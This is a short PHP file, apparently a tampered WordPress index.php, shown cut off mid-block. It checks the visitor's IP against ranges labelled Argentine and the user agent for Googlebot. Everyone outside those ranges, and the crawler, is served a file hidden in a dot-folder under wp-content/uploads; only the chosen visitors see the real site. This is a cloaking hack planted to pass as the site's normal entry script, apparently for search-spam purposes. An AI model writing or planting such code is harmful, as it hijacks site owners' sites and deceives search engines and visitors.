<?php
$ip = $_SERVER['REMOTE_ADDR'];

// 
$argentina_ranges = [
    ['181.0.0.0', '181.31.255.255'],
    ['190.0.0.0', '190.255.255.255'],
    ['200.0.0.0', '200.255.255.255'],
    // 
];

function ip_in_range($ip, $range) {
    $ip_dec = ip2long($ip);
    return ($ip_dec >= ip2long($range[0]) && $ip_dec <= ip2long($range[1]));
}

$is_argentina = false;
foreach ($argentina_ranges as $range) {
    if (ip_in_range($ip, $range)) {
        $is_argentina = true;
        break;
    }
}

// Cloaking
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
if (!$is_argentina || strpos($ua, 'googlebot') !== false) {
    echo file_get_contents(__DIR__.'/wp-content/uploads/.campus/colegio.php');
    exit;
} else {
    define('WP_USE_THEMES', true);
    require __DIR__ . '/wp-blog-header.php';
